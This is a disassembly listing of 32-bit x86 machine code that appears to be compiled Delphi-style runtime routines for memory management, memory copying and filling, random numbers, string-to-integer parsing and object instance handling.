  402394:	7c 1b                	jl     0x4023b1
  402396:	8b dd                	mov    %ebp,%ebx
  402398:	03 de                	add    %esi,%ebx
  40239a:	8b 04 24             	mov    (%esp),%eax
  40239d:	83 c8 02             	or     $0x2,%eax
  4023a0:	89 03                	mov    %eax,(%ebx)
  4023a2:	8b c3                	mov    %ebx,%eax
  4023a4:	83 c0 04             	add    $0x4,%eax
  4023a7:	e8 c8 f7 ff ff       	call   0x401b74
  4023ac:	e9 fe 00 00 00       	jmp    0x4024af
  4023b1:	8b f7                	mov    %edi,%esi
  4023b3:	e9 f7 00 00 00       	jmp    0x4024af
  4023b8:	8b c6                	mov    %esi,%eax
  4023ba:	2b c7                	sub    %edi,%eax
  4023bc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4023c0:	3b 1d 70 b4 40 00    	cmp    0x40b470,%ebx
  4023c6:	75 67                	jne    0x40242f
  4023c8:	a1 6c b4 40 00       	mov    0x40b46c,%eax
  4023cd:	3b 44 24 04          	cmp    0x4(%esp),%eax
  4023d1:	7c 53                	jl     0x402426
  4023d3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023d7:	29 05 6c b4 40 00    	sub    %eax,0x40b46c
  4023dd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023e1:	01 05 70 b4 40 00    	add    %eax,0x40b470
  4023e7:	83 3d 6c b4 40 00 0c 	cmpl   $0xc,0x40b46c
  4023ee:	7d 18                	jge    0x402408
  4023f0:	a1 6c b4 40 00       	mov    0x40b46c,%eax
  4023f5:	01 05 70 b4 40 00    	add    %eax,0x40b470
  4023fb:	03 35 6c b4 40 00    	add    0x40b46c,%esi
  402401:	33 c0                	xor    %eax,%eax
  402403:	a3 6c b4 40 00       	mov    %eax,0x40b46c
  402408:	8b c6                	mov    %esi,%eax
  40240a:	2b c7                	sub    %edi,%eax
  40240c:	01 05 00 b4 40 00    	add    %eax,0x40b400
  402412:	8b 45 00             	mov    0x0(%ebp),%eax
  402415:	25 03 00 00 80       	and    $0x80000003,%eax
  40241a:	0b f0                	or     %eax,%esi
  40241c:	89 75 00             	mov    %esi,0x0(%ebp)
  40241f:	b0 01                	mov    $0x1,%al
  402421:	e9 a2 00 00 00       	jmp    0x4024c8
  402426:	e8 55 f9 ff ff       	call   0x401d80
  40242b:	8b dd                	mov    %ebp,%ebx
  40242d:	03 df                	add    %edi,%ebx
  40242f:	f6 03 02             	testb  $0x2,(%ebx)
  402432:	75 4d                	jne    0x402481
  402434:	8b d3                	mov    %ebx,%edx
  402436:	8b c2                	mov    %edx,%eax
  402438:	8b 48 08             	mov    0x8(%eax),%ecx
  40243b:	89 0c 24             	mov    %ecx,(%esp)
  40243e:	8b 0c 24             	mov    (%esp),%ecx
  402441:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  402445:	73 0e                	jae    0x402455
  402447:	03 14 24             	add    (%esp),%edx
  40244a:	8b da                	mov    %edx,%ebx
  40244c:	8b 04 24             	mov    (%esp),%eax
  40244f:	29 44 24 04          	sub    %eax,0x4(%esp)
  402453:	eb 2c                	jmp    0x402481
  402455:	e8 66 f6 ff ff       	call   0x401ac0
  40245a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40245e:	29 04 24             	sub    %eax,(%esp)
  402461:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402465:	7c 0e                	jl     0x402475
  402467:	8b c5                	mov    %ebp,%eax
  402469:	03 c6                	add    %esi,%eax
  40246b:	8b 14 24             	mov    (%esp),%edx
  40246e:	e8 8d f8 ff ff       	call   0x401d00
  402473:	eb 3a                	jmp    0x4024af
  402475:	03 34 24             	add    (%esp),%esi
  402478:	8b dd                	mov    %ebp,%ebx
  40247a:	03 de                	add    %esi,%ebx
  40247c:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  40247f:	eb 2e                	jmp    0x4024af
  402481:	8b 03                	mov    (%ebx),%eax
  402483:	a9 00 00 00 80       	test   $0x80000000,%eax
  402488:	74 21                	je     0x4024ab
  40248a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40248f:	03 c3                	add    %ebx,%eax
  402491:	8b d8                	mov    %eax,%ebx
  402493:	8b 54 24 04          	mov    0x4(%esp),%edx
  402497:	8b c3                	mov    %ebx,%eax
  402499:	e8 e6 f9 ff ff       	call   0x401e84
  40249e:	84 c0                	test   %al,%al
  4024a0:	74 09                	je     0x4024ab
  4024a2:	8b dd                	mov    %ebp,%ebx
  4024a4:	03 df                	add    %edi,%ebx
  4024a6:	e9 0d ff ff ff       	jmp    0x4023b8
  4024ab:	33 c0                	xor    %eax,%eax
  4024ad:	eb 19                	jmp    0x4024c8
  4024af:	8b c6                	mov    %esi,%eax
  4024b1:	2b c7                	sub    %edi,%eax
  4024b3:	01 05 00 b4 40 00    	add    %eax,0x40b400
  4024b9:	8b 45 00             	mov    0x0(%ebp),%eax
  4024bc:	25 03 00 00 80       	and    $0x80000003,%eax
  4024c1:	0b f0                	or     %eax,%esi
  4024c3:	89 75 00             	mov    %esi,0x0(%ebp)
  4024c6:	b0 01                	mov    $0x1,%al
  4024c8:	59                   	pop    %ecx
  4024c9:	5a                   	pop    %edx
  4024ca:	5d                   	pop    %ebp
  4024cb:	5f                   	pop    %edi
  4024cc:	5e                   	pop    %esi
  4024cd:	5b                   	pop    %ebx
  4024ce:	c3                   	ret
  4024cf:	90                   	nop
  4024d0:	55                   	push   %ebp
  4024d1:	8b ec                	mov    %esp,%ebp
  4024d3:	51                   	push   %ecx
  4024d4:	53                   	push   %ebx
  4024d5:	56                   	push   %esi
  4024d6:	57                   	push   %edi
  4024d7:	8b f2                	mov    %edx,%esi
  4024d9:	8b d8                	mov    %eax,%ebx
  4024db:	80 3d 15 b4 40 00 00 	cmpb   $0x0,0x40b415
  4024e2:	75 13                	jne    0x4024f7
  4024e4:	e8 2f f4 ff ff       	call   0x401918
  4024e9:	84 c0                	test   %al,%al
  4024eb:	75 0a                	jne    0x4024f7
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024f2:	e9 92 00 00 00       	jmp    0x402589
  4024f7:	33 d2                	xor    %edx,%edx
  4024f9:	55                   	push   %ebp
  4024fa:	68 82 25 40 00       	push   $0x402582
  4024ff:	64 ff 32             	push   %fs:(%edx)
  402502:	64 89 22             	mov    %esp,%fs:(%edx)
  402505:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  40250c:	74 0a                	je     0x402518
  40250e:	68 1c b4 40 00       	push   $0x40b41c
  402513:	e8 5c ed ff ff       	call   0x401274
  402518:	8b d6                	mov    %esi,%edx
  40251a:	8b c3                	mov    %ebx,%eax
  40251c:	e8 df fd ff ff       	call   0x402300
  402521:	84 c0                	test   %al,%al
  402523:	74 05                	je     0x40252a
  402525:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402528:	eb 37                	jmp    0x402561
  40252a:	8b c6                	mov    %esi,%eax
  40252c:	e8 a3 fa ff ff       	call   0x401fd4
  402531:	8b f8                	mov    %eax,%edi
  402533:	8b c3                	mov    %ebx,%eax
  402535:	83 e8 04             	sub    $0x4,%eax
  402538:	8b 00                	mov    (%eax),%eax
  40253a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40253f:	83 e8 04             	sub    $0x4,%eax
  402542:	3b f0                	cmp    %eax,%esi
  402544:	7d 02                	jge    0x402548
  402546:	8b c6                	mov    %esi,%eax
  402548:	85 ff                	test   %edi,%edi
  40254a:	74 12                	je     0x40255e
  40254c:	8b c8                	mov    %eax,%ecx
  40254e:	8b d7                	mov    %edi,%edx
  402550:	8b c3                	mov    %ebx,%eax
  402552:	e8 2d 01 00 00       	call   0x402684
  402557:	8b c3                	mov    %ebx,%eax
  402559:	e8 fe fb ff ff       	call   0x40215c
  40255e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402561:	33 c0                	xor    %eax,%eax
  402563:	5a                   	pop    %edx
  402564:	59                   	pop    %ecx
  402565:	59                   	pop    %ecx
  402566:	64 89 10             	mov    %edx,%fs:(%eax)
  402569:	68 89 25 40 00       	push   $0x402589
  40256e:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  402575:	74 0a                	je     0x402581
  402577:	68 1c b4 40 00       	push   $0x40b41c
  40257c:	e8 fb ec ff ff       	call   0x40127c
  402581:	c3                   	ret
  402582:	e9 75 08 00 00       	jmp    0x402dfc
  402587:	eb e5                	jmp    0x40256e
  402589:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40258c:	5f                   	pop    %edi
  40258d:	5e                   	pop    %esi
  40258e:	5b                   	pop    %ebx
  40258f:	59                   	pop    %ecx
  402590:	5d                   	pop    %ebp
  402591:	c3                   	ret
  402592:	8b c0                	mov    %eax,%eax
  402594:	85 c0                	test   %eax,%eax
  402596:	74 0a                	je     0x4025a2
  402598:	ff 15 04 a0 40 00    	call   *0x40a004
  40259e:	09 c0                	or     %eax,%eax
  4025a0:	74 01                	je     0x4025a3
  4025a2:	c3                   	ret
  4025a3:	b0 01                	mov    $0x1,%al
  4025a5:	e9 6a 00 00 00       	jmp    0x402614
  4025aa:	c3                   	ret
  4025ab:	90                   	nop
  4025ac:	85 c0                	test   %eax,%eax
  4025ae:	74 0a                	je     0x4025ba
  4025b0:	ff 15 08 a0 40 00    	call   *0x40a008
  4025b6:	09 c0                	or     %eax,%eax
  4025b8:	75 01                	jne    0x4025bb
  4025ba:	c3                   	ret
  4025bb:	b0 02                	mov    $0x2,%al
  4025bd:	e9 52 00 00 00       	jmp    0x402614
  4025c2:	c3                   	ret
  4025c3:	90                   	nop
  4025c4:	8b 08                	mov    (%eax),%ecx
  4025c6:	85 c9                	test   %ecx,%ecx
  4025c8:	74 32                	je     0x4025fc
  4025ca:	85 d2                	test   %edx,%edx
  4025cc:	74 18                	je     0x4025e6
  4025ce:	50                   	push   %eax
  4025cf:	89 c8                	mov    %ecx,%eax
  4025d1:	ff 15 0c a0 40 00    	call   *0x40a00c
  4025d7:	59                   	pop    %ecx
  4025d8:	09 c0                	or     %eax,%eax
  4025da:	74 19                	je     0x4025f5
  4025dc:	89 01                	mov    %eax,(%ecx)
  4025de:	c3                   	ret
  4025df:	b0 02                	mov    $0x2,%al
  4025e1:	e9 2e 00 00 00       	jmp    0x402614
  4025e6:	89 10                	mov    %edx,(%eax)
  4025e8:	89 c8                	mov    %ecx,%eax
  4025ea:	ff 15 08 a0 40 00    	call   *0x40a008
  4025f0:	09 c0                	or     %eax,%eax
  4025f2:	75 eb                	jne    0x4025df
  4025f4:	c3                   	ret
  4025f5:	b0 01                	mov    $0x1,%al
  4025f7:	e9 18 00 00 00       	jmp    0x402614
  4025fc:	85 d2                	test   %edx,%edx
  4025fe:	74 10                	je     0x402610
  402600:	50                   	push   %eax
  402601:	89 d0                	mov    %edx,%eax
  402603:	ff 15 04 a0 40 00    	call   *0x40a004
  402609:	59                   	pop    %ecx
  40260a:	09 c0                	or     %eax,%eax
  40260c:	74 e7                	je     0x4025f5
  40260e:	89 01                	mov    %eax,(%ecx)
  402610:	c3                   	ret
  402611:	8d 40 00             	lea    0x0(%eax),%eax
  402614:	83 e0 7f             	and    $0x7f,%eax
  402617:	8b 0d 04 b0 40 00    	mov    0x40b004,%ecx
  40261d:	85 c9                	test   %ecx,%ecx
  40261f:	74 03                	je     0x402624
  402621:	5a                   	pop    %edx
  402622:	ff d1                	call   *%ecx
  402624:	48                   	dec    %eax
  402625:	8a 80 3d 26 40 00    	mov    0x40263d(%eax),%al
  40262b:	79 0b                	jns    0x402638
  40262d:	e8 22 0b 00 00       	call   0x403154
  402632:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  402638:	e9 04 18 00 00       	jmp    0x403e41
  40263d:	cb                   	lret
  40263e:	cc                   	int3
  40263f:	c8 c9 d7 cf          	enter  $0xd7c9,$0xcf
  402643:	c8 cd ce db          	enter  $0xcecd,$0xdb
  402647:	d8 ca                	fmul   %st(2),%st
  402649:	d9 da                	(bad)
  40264b:	dc dd                	(bad)
  40264d:	de df                	(bad)
  40264f:	e0 e1                	loopne 0x402632
  402651:	c3                   	ret
  402652:	8b c0                	mov    %eax,%eax
  402654:	50                   	push   %eax
  402655:	52                   	push   %edx
  402656:	51                   	push   %ecx
  402657:	e8 f8 0a 00 00       	call   0x403154
  40265c:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  402663:	59                   	pop    %ecx
  402664:	5a                   	pop    %edx
  402665:	58                   	pop    %eax
  402666:	75 01                	jne    0x402669
  402668:	c3                   	ret
  402669:	31 c0                	xor    %eax,%eax
  40266b:	e9 a4 ff ff ff       	jmp    0x402614
  402670:	c3                   	ret
  402671:	8d 40 00             	lea    0x0(%eax),%eax
  402674:	50                   	push   %eax
  402675:	e8 da 0a 00 00       	call   0x403154
  40267a:	8f 80 04 00 00 00    	pop    0x4(%eax)
  402680:	c3                   	ret
  402681:	8d 40 00             	lea    0x0(%eax),%eax
  402684:	56                   	push   %esi
  402685:	57                   	push   %edi
  402686:	89 c6                	mov    %eax,%esi
  402688:	89 d7                	mov    %edx,%edi
  40268a:	89 c8                	mov    %ecx,%eax
  40268c:	39 f7                	cmp    %esi,%edi
  40268e:	7f 13                	jg     0x4026a3
  402690:	74 2f                	je     0x4026c1
  402692:	c1 f9 02             	sar    $0x2,%ecx
  402695:	78 2a                	js     0x4026c1
  402697:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402699:	89 c1                	mov    %eax,%ecx
  40269b:	83 e1 03             	and    $0x3,%ecx
  40269e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4026a0:	5f                   	pop    %edi
  4026a1:	5e                   	pop    %esi
  4026a2:	c3                   	ret
  4026a3:	8d 74 0e fc          	lea    -0x4(%esi,%ecx,1),%esi
  4026a7:	8d 7c 0f fc          	lea    -0x4(%edi,%ecx,1),%edi
  4026ab:	c1 f9 02             	sar    $0x2,%ecx
  4026ae:	78 11                	js     0x4026c1
  4026b0:	fd                   	std
  4026b1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4026b3:	89 c1                	mov    %eax,%ecx
  4026b5:	83 e1 03             	and    $0x3,%ecx
  4026b8:	83 c6 03             	add    $0x3,%esi
  4026bb:	83 c7 03             	add    $0x3,%edi
  4026be:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4026c0:	fc                   	cld
  4026c1:	5f                   	pop    %edi
  4026c2:	5e                   	pop    %esi
  4026c3:	c3                   	ret
  4026c4:	55                   	push   %ebp
  4026c5:	8b ec                	mov    %esp,%ebp
  4026c7:	83 c4 e8             	add    $0xffffffe8,%esp
  4026ca:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4026cd:	50                   	push   %eax
  4026ce:	e8 c9 ea ff ff       	call   0x40119c
  4026d3:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  4026d7:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4026da:	66 03 45 f2          	add    -0xe(%ebp),%ax
  4026de:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4026e1:	31 d2                	xor    %edx,%edx
  4026e3:	66 8b 55 f4          	mov    -0xc(%ebp),%dx
  4026e7:	01 d0                	add    %edx,%eax
  4026e9:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  4026ef:	66 8b 55 f6          	mov    -0xa(%ebp),%dx
  4026f3:	01 d0                	add    %edx,%eax
  4026f5:	89 05 2c b0 40 00    	mov    %eax,0x40b02c
  4026fb:	8b e5                	mov    %ebp,%esp
  4026fd:	5d                   	pop    %ebp
  4026fe:	c3                   	ret
  4026ff:	90                   	nop
  402700:	b8 d2 00 00 00       	mov    $0xd2,%eax
  402705:	e9 37 17 00 00       	jmp    0x403e41
  40270a:	c3                   	ret
  40270b:	90                   	nop
  40270c:	53                   	push   %ebx
  40270d:	56                   	push   %esi
  40270e:	51                   	push   %ecx
  40270f:	89 ce                	mov    %ecx,%esi
  402711:	c1 ee 02             	shr    $0x2,%esi
  402714:	74 26                	je     0x40273c
  402716:	8b 08                	mov    (%eax),%ecx
  402718:	8b 1a                	mov    (%edx),%ebx
  40271a:	39 d9                	cmp    %ebx,%ecx
  40271c:	75 45                	jne    0x402763
  40271e:	4e                   	dec    %esi
  40271f:	74 15                	je     0x402736
  402721:	8b 48 04             	mov    0x4(%eax),%ecx
  402724:	8b 5a 04             	mov    0x4(%edx),%ebx
  402727:	39 d9                	cmp    %ebx,%ecx
  402729:	75 38                	jne    0x402763
  40272b:	83 c0 08             	add    $0x8,%eax
  40272e:	83 c2 08             	add    $0x8,%edx
  402731:	4e                   	dec    %esi
  402732:	75 e2                	jne    0x402716
  402734:	eb 06                	jmp    0x40273c
  402736:	83 c0 04             	add    $0x4,%eax
  402739:	83 c2 04             	add    $0x4,%edx
  40273c:	5e                   	pop    %esi
  40273d:	83 e6 03             	and    $0x3,%esi
  402740:	74 36                	je     0x402778
  402742:	8a 08                	mov    (%eax),%cl
  402744:	3a 0a                	cmp    (%edx),%cl
  402746:	75 30                	jne    0x402778
  402748:	4e                   	dec    %esi
  402749:	74 13                	je     0x40275e
  40274b:	8a 48 01             	mov    0x1(%eax),%cl
  40274e:	3a 4a 01             	cmp    0x1(%edx),%cl
  402751:	75 25                	jne    0x402778
  402753:	4e                   	dec    %esi
  402754:	74 08                	je     0x40275e
  402756:	8a 48 02             	mov    0x2(%eax),%cl
  402759:	3a 4a 02             	cmp    0x2(%edx),%cl
  40275c:	75 1a                	jne    0x402778
  40275e:	31 c0                	xor    %eax,%eax
  402760:	5e                   	pop    %esi
  402761:	5b                   	pop    %ebx
  402762:	c3                   	ret
  402763:	5e                   	pop    %esi
  402764:	38 d9                	cmp    %bl,%cl
  402766:	75 10                	jne    0x402778
  402768:	38 fd                	cmp    %bh,%ch
  40276a:	75 0c                	jne    0x402778
  40276c:	c1 e9 10             	shr    $0x10,%ecx
  40276f:	c1 eb 10             	shr    $0x10,%ebx
  402772:	38 d9                	cmp    %bl,%cl
  402774:	75 02                	jne    0x402778
  402776:	38 fd                	cmp    %bh,%ch
  402778:	5e                   	pop    %esi
  402779:	5b                   	pop    %ebx
  40277a:	c3                   	ret
  40277b:	90                   	nop
  40277c:	57                   	push   %edi
  40277d:	89 c7                	mov    %eax,%edi
  40277f:	88 cd                	mov    %cl,%ch
  402781:	89 c8                	mov    %ecx,%eax
  402783:	c1 e0 10             	shl    $0x10,%eax
  402786:	66 89 c8             	mov    %cx,%ax
  402789:	89 d1                	mov    %edx,%ecx
  40278b:	c1 f9 02             	sar    $0x2,%ecx
  40278e:	78 09                	js     0x402799
  402790:	f3 ab                	rep stos %eax,%es:(%edi)
  402792:	89 d1                	mov    %edx,%ecx
  402794:	83 e1 03             	and    $0x3,%ecx
  402797:	f3 aa                	rep stos %al,%es:(%edi)
  402799:	5f                   	pop    %edi
  40279a:	c3                   	ret
  40279b:	90                   	nop
  40279c:	69 15 2c b0 40 00 05 	imul   $0x8088405,0x40b02c,%edx
  4027a3:	84 08 08 
  4027a6:	42                   	inc    %edx
  4027a7:	89 15 2c b0 40 00    	mov    %edx,0x40b02c
  4027ad:	f7 e2                	mul    %edx
  4027af:	89 d0                	mov    %edx,%eax
  4027b1:	c3                   	ret
  4027b2:	8b c0                	mov    %eax,%eax
  4027b4:	53                   	push   %ebx
  4027b5:	56                   	push   %esi
  4027b6:	57                   	push   %edi
  4027b7:	89 c6                	mov    %eax,%esi
  4027b9:	50                   	push   %eax
  4027ba:	85 c0                	test   %eax,%eax
  4027bc:	74 51                	je     0x40280f
  4027be:	31 c0                	xor    %eax,%eax
  4027c0:	31 db                	xor    %ebx,%ebx
  4027c2:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  4027c7:	8a 1e                	mov    (%esi),%bl
  4027c9:	46                   	inc    %esi
  4027ca:	80 fb 20             	cmp    $0x20,%bl
  4027cd:	74 f8                	je     0x4027c7
  4027cf:	b5 00                	mov    $0x0,%ch
  4027d1:	80 fb 2d             	cmp    $0x2d,%bl
  4027d4:	74 45                	je     0x40281b
  4027d6:	80 fb 2b             	cmp    $0x2b,%bl
  4027d9:	74 42                	je     0x40281d
  4027db:	80 fb 24             	cmp    $0x24,%bl
  4027de:	74 42                	je     0x402822
  4027e0:	84 db                	test   %bl,%bl
  4027e2:	74 32                	je     0x402816
  4027e4:	80 eb 30             	sub    $0x30,%bl
  4027e7:	80 fb 09             	cmp    $0x9,%bl
  4027ea:	77 2a                	ja     0x402816
  4027ec:	39 f8                	cmp    %edi,%eax
  4027ee:	77 26                	ja     0x402816
  4027f0:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4027f3:	01 c0                	add    %eax,%eax
  4027f5:	01 d8                	add    %ebx,%eax
  4027f7:	8a 1e                	mov    (%esi),%bl
  4027f9:	46                   	inc    %esi
  4027fa:	84 db                	test   %bl,%bl
  4027fc:	75 e6                	jne    0x4027e4
  4027fe:	fe cd                	dec    %ch
  402800:	74 10                	je     0x402812
  402802:	85 c0                	test   %eax,%eax
  402804:	7c 10                	jl     0x402816
  402806:	59                   	pop    %ecx
  402807:	31 f6                	xor    %esi,%esi
  402809:	89 32                	mov    %esi,(%edx)
  40280b:	5f                   	pop    %edi
  40280c:	5e                   	pop    %esi
  40280d:	5b                   	pop    %ebx
  40280e:	c3                   	ret
  40280f:	46                   	inc    %esi
  402810:	eb 04                	jmp    0x402816
  402812:	f7 d8                	neg    %eax
  402814:	7e f0                	jle    0x402806
  402816:	5b                   	pop    %ebx
  402817:	29 de                	sub    %ebx,%esi
  402819:	eb ee                	jmp    0x402809
  40281b:	fe c5                	inc    %ch
  40281d:	8a 1e                	mov    (%esi),%bl
  40281f:	46                   	inc    %esi
  402820:	eb be                	jmp    0x4027e0
  402822:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402827:	8a 1e                	mov    (%esi),%bl
  402829:	46                   	inc    %esi
  40282a:	84 db                	test   %bl,%bl
  40282c:	74 e1                	je     0x40280f
  40282e:	80 fb 61             	cmp    $0x61,%bl
  402831:	72 03                	jb     0x402836
  402833:	80 eb 20             	sub    $0x20,%bl
  402836:	80 eb 30             	sub    $0x30,%bl
  402839:	80 fb 09             	cmp    $0x9,%bl
  40283c:	76 0b                	jbe    0x402849
  40283e:	80 eb 11             	sub    $0x11,%bl
  402841:	80 fb 05             	cmp    $0x5,%bl
  402844:	77 d0                	ja     0x402816
  402846:	80 c3 0a             	add    $0xa,%bl
  402849:	39 f8                	cmp    %edi,%eax
  40284b:	77 c9                	ja     0x402816
  40284d:	c1 e0 04             	shl    $0x4,%eax
  402850:	01 d8                	add    %ebx,%eax
  402852:	8a 1e                	mov    (%esi),%bl
  402854:	46                   	inc    %esi
  402855:	84 db                	test   %bl,%bl
  402857:	75 d5                	jne    0x40282e
  402859:	eb ab                	jmp    0x402806
  40285b:	c3                   	ret
  40285c:	db e3                	fninit
  40285e:	9b d9 2d 10 a0 40 00 	fldcw  0x40a010
  402865:	c3                   	ret
  402866:	8b c0                	mov    %eax,%eax
  402868:	8b 00                	mov    (%eax),%eax
  40286a:	c3                   	ret
  40286b:	90                   	nop
  40286c:	56                   	push   %esi
  40286d:	57                   	push   %edi
  40286e:	89 d7                	mov    %edx,%edi
  402870:	8b 70 e4             	mov    -0x1c(%eax),%esi
  402873:	31 c9                	xor    %ecx,%ecx
  402875:	8a 0e                	mov    (%esi),%cl
  402877:	41                   	inc    %ecx
  402878:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40287a:	5f                   	pop    %edi
  40287b:	5e                   	pop    %esi
  40287c:	c3                   	ret
  40287d:	8d 40 00             	lea    0x0(%eax),%eax
  402880:	53                   	push   %ebx
  402881:	31 db                	xor    %ebx,%ebx
  402883:	09 d2                	or     %edx,%edx
  402885:	74 1c                	je     0x4028a3
  402887:	8b 40 e4             	mov    -0x1c(%eax),%eax
  40288a:	31 c9                	xor    %ecx,%ecx
  40288c:	8a 08                	mov    (%eax),%cl
  40288e:	3b 4a fc             	cmp    -0x4(%edx),%ecx
  402891:	75 10                	jne    0x4028a3
  402893:	4a                   	dec    %edx
  402894:	8a 3c 08             	mov    (%eax,%ecx,1),%bh
  402897:	32 3c 0a             	xor    (%edx,%ecx,1),%bh
  40289a:	80 e7 df             	and    $0xdf,%bh
  40289d:	75 04                	jne    0x4028a3
  40289f:	49                   	dec    %ecx
  4028a0:	75 f2                	jne    0x402894
  4028a2:	43                   	inc    %ebx
  4028a3:	88 d8                	mov    %bl,%al
  4028a5:	5b                   	pop    %ebx
  4028a6:	c3                   	ret
  4028a7:	90                   	nop
  4028a8:	8b 40 ec             	mov    -0x14(%eax),%eax
  4028ab:	c3                   	ret
  4028ac:	57                   	push   %edi
  4028ad:	50                   	push   %eax
  4028ae:	8b 40 e8             	mov    -0x18(%eax),%eax
  4028b1:	e8 de fc ff ff       	call   0x402594
  4028b6:	89 c7                	mov    %eax,%edi
  4028b8:	89 c2                	mov    %eax,%edx
  4028ba:	58                   	pop    %eax
  4028bb:	ab                   	stos   %eax,%es:(%edi)
  4028bc:	8b 48 e8             	mov    -0x18(%eax),%ecx
  4028bf:	31 c0                	xor    %eax,%eax
  4028c1:	51                   	push   %ecx
  4028c2:	c1 e9 02             	shr    $0x2,%ecx
  4028c5:	49                   	dec    %ecx
  4028c6:	f3 ab                	rep stos %eax,%es:(%edi)
  4028c8:	59                   	pop    %ecx
  4028c9:	83 e1 03             	and    $0x3,%ecx
  4028cc:	f3 aa                	rep stos %al,%es:(%edi)
  4028ce:	89 d0                	mov    %edx,%eax
  4028d0:	5f                   	pop    %edi
  4028d1:	c3                   	ret
  4028d2:	8b c0                	mov    %eax,%eax
  4028d4:	53                   	push   %ebx
  4028d5:	56                   	push   %esi
  4028d6:	89 c3                	mov    %eax,%ebx
  4028d8:	8b 30                	mov    (%eax),%esi
  4028da:	8b 56 d0             	mov    -0x30(%esi),%edx
  4028dd:	8b 76 ec             	mov    -0x14(%esi),%esi
  4028e0:	85 d2                	test   %edx,%edx
  4028e2:	74 07                	je     0x4028eb
  4028e4:	e8 6b 0c 00 00       	call   0x403554
  4028e9:	89 d8                	mov    %ebx,%eax
  4028eb:	85 f6                	test   %esi,%esi
  4028ed:	75 eb                	jne    0x4028da
  4028ef:	e8 b8 fc ff ff       	call   0x4025ac
  4028f4:	5e                   	pop    %esi
  4028f5:	5b                   	pop    %ebx
  4028f6:	c3                   	ret
  4028f7:	90                   	nop
  4028f8:	8b 40 e8             	mov    -0x18(%eax),%eax
  4028fb:	c3                   	ret
  4028fc:	84 d2                	test   %dl,%dl
  4028fe:	74 08                	je     0x402908
  402900:	83 c4 f0             	add    $0xfffffff0,%esp
  402903:	e8 c0 01 00 00       	call   0x402ac8
  402908:	84 d2                	test   %dl,%dl
  40290a:	74 0a                	je     0x402916
  40290c:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402913:	83 c4 0c             	add    $0xc,%esp
  402916:	c3                   	ret
  402917:	90                   	nop
  402918:	84 d2                	test   %dl,%dl
  40291a:	74 05                	je     0x402921
  40291c:	e8 e3 01 00 00       	call   0x402b04
  402921:	c3                   	ret
  402922:	8b c0                	mov    %eax,%eax
  402924:	85 c0                	test   %eax,%eax
  402926:	74 07                	je     0x40292f
  402928:	8b 08                	mov    (%eax),%ecx
  40292a:	b2 01                	mov    $0x1,%dl
  40292c:	ff 51 fc             	call   *-0x4(%ecx)
  40292f:	c3                   	ret
  402930:	57                   	push   %edi
  402931:	89 d7                	mov    %edx,%edi
  402933:	ab                   	stos   %eax,%es:(%edi)
  402934:	8b 48 e8             	mov    -0x18(%eax),%ecx
  402937:	31 c0                	xor    %eax,%eax
  402939:	51                   	push   %ecx
  40293a:	c1 e9 02             	shr    $0x2,%ecx
  40293d:	49                   	dec    %ecx
  40293e:	f3 ab                	rep stos %eax,%es:(%edi)
  402940:	59                   	pop    %ecx
  402941:	83 e1 03             	and    $0x3,%ecx
  402944:	f3 aa                	rep stos %al,%es:(%edi)
  402946:	89 d0                	mov    %edx,%eax
  402948:	5f                   	pop    %edi
  402949:	c3                   	ret
  40294a:	8b c0                	mov    %eax,%eax
  40294c:	53                   	push   %ebx
  40294d:	56                   	push   %esi
  40294e:	89 c3                	mov    %eax,%ebx
  402950:	8b 30                	mov    (%eax),%esi
  402952:	8b 56 d0             	mov    -0x30(%esi),%edx
  402955:	8b 76 ec             	mov    -0x14(%esi),%esi
  402958:	85 d2                	test   %edx,%edx
  40295a:	74 07                	je     0x402963
  40295c:	e8 f3 0b 00 00       	call   0x403554
  402961:	89 d8                	mov    %ebx,%eax
  402963:	85 f6                	test   %esi,%esi
  402965:	75 eb                	jne    0x402952
  402967:	5e                   	pop    %esi
  402968:	5b                   	pop    %ebx
  402969:	c3                   	ret
  40296a:	8b c0                	mov    %eax,%eax
  40296c:	85 c0                	test   %eax,%eax
  40296e:	74 10                	je     0x402980
  402970:	8b 00                	mov    (%eax),%eax
  402972:	39 d0                	cmp    %edx,%eax
  402974:	74 08                	je     0x40297e
  402976:	8b 40 ec             	mov    -0x14(%eax),%eax
  402979:	85 c0                	test   %eax,%eax
  40297b:	75 f5                	jne    0x402972
  40297d:	c3                   	ret
  40297e:	b0 01                	mov    $0x1,%al
  402980:	c3                   	ret
  402981:	8d 40 00             	lea    0x0(%eax),%eax
  402984:	57                   	push   %edi
  402985:	93                   	xchg   %eax,%ebx
  402986:	8b 7b e0             	mov    -0x20(%ebx),%edi
  402989:	85 ff                	test   %edi,%edi
  40298b:	74 0d                	je     0x40299a
  40298d:	0f b7 0f             	movzwl (%edi),%ecx
  402990:	51                   	push   %ecx
  402991:	83 c7 02             	add    $0x2,%edi
  402994:	66 f2 af             	repnz scas %es:(%edi),%ax
